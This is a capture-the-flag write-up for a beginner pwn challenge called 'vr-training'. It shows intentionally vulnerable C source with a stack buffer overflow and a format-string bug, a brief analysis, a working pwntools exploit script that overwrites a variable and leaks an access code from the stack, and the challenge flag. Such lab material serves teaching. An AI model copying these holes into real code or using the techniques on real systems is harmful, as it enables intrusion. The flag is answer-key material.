# vr-training

[library.m0unt41n.ch/challenges/vr-training](https://library.m0unt41n.ch/challenges/vr-training) ![](../../resources/pwn.svg) ![](../../resources/baby.svg) 

# TL;DR

We get a binary **and** source code, with multiple vulnerabilities

Hint: *Around %30$p*

# Source

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void print_pattern() {
  puts("  _____        _____        _____");
  puts(" /     \\      /     \\      /     \\");
  puts("<       >----<       >----<       >");
  puts(" \\_____/      \\_____/      \\_____/");
  puts(" /     \\      /     \\      /     \\");
  puts("<       >----<       >----<       >----.");
  puts(" \\_____/      \\_____/      \\_____/      \\");
  puts("       \\      /     \\      /     \\      /");
  puts("        >----<       >----<       >----<");
  puts("       /      \\_____/      \\_____/      \\_____");
  puts("       \\      /     \\      /     \\      /     \\");
  puts("        `----<       >----<       >----<       >");
  puts("              \\_____/      \\_____/      \\_____/");
  puts("                           /     \\      /");
  puts("                          <       >----'");
  puts("                           \\_____/");
  puts("");
}

void fail() {
  puts("[-] VR Training failed!");
  exit(0);
}

int main() {
  setbuf(stdout, 0);
  print_pattern();

  puts("Welcome to the VR training soldier.");
  puts("Binary Exploitation is an important skillset for members of the Force XXI!");
  puts("[...] We start with Buffer Overflow 10");

  // exploit a stack based buffer overflow
  int value = 0;
  char buffer[64];
  printf("Your input: ");
  fgets(buffer, 100, stdin);
  if(value != 0xdeadbeef) {
   fail();
  }

  // exploit a format string attack
  puts("[+] Good!");
  puts("[...] Next is Format String 10");

  FILE *access_code_file = fopen("access_code", "r");
  char access_code[64];
  fread(access_code, 64, 1, access_code_file);

  char format[64];
  printf("Your input: ");
  fgets(format, 64, stdin);
  printf(format);

  char input_access_code[64];
  printf("Your access code: ");
  fgets(input_access_code, 64, stdin);

  if(strcmp(access_code, input_access_code) != 0) {
    fail();
  }

  puts("[+] Congratulations, you have successfully completed the VR training!");
  FILE *flag_file = fopen("flag", "r");
  char flag[64];
  fread(flag, 64, 1, flag_file);
  printf("[+] Flag: %s\n", flag);
}
```

# Analysis

There is not that much to "analyze", as we're told everything &#128578;

*   Buffer overflow in `fgets(buffer, 100, stdin)` (the buffer is only
    64 bytes long)
*   Format string vulnerability in `printf(format)`, and (from the hint),
    the interesting part starts at `%30$`
*   The various byte arrays follow one after the other in memory

We have to:

*   For the first input: send enough bytes into `buffer[]` to
    overwrite `value` with `0xdeadbeef`.
*   For the second input: send enough `%NN$016llx` to extract `access_code`
    from the stack (I prefer `%016llx` to `%p`).
*   For the third input: use above access code to get the flag.

# Exploit

```python
import pwn

pwn.context.update(encoding='ascii', log_level='warning')
io = pwn.process('./vr')

payload1 = b'A'*(96-4) + b'\xef\xbe\xad\xde'
io.recvuntil(b"Your input: ")
io.sendline(payload1)

payload2 = b'%30$016llx %31$016llx %32$016llx'
io.recvuntil("Your input: ")
io.sendline(payload2)

access_code = ''
for qword in io.recvlineS().strip().split(" "):
  for pos in range(14,-2,-2):
    access_code += chr(int(qword[pos:pos+2], 16))

io.recvuntil(b"Your access code: ")
io.sendline(access_code)
io.recvuntil(b"Flag: ")
print(io.recvallS().strip())
```

---

## `shc2023{y0u_c0mpl3t3d_VR_tr41n1ng_s0ld13r}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
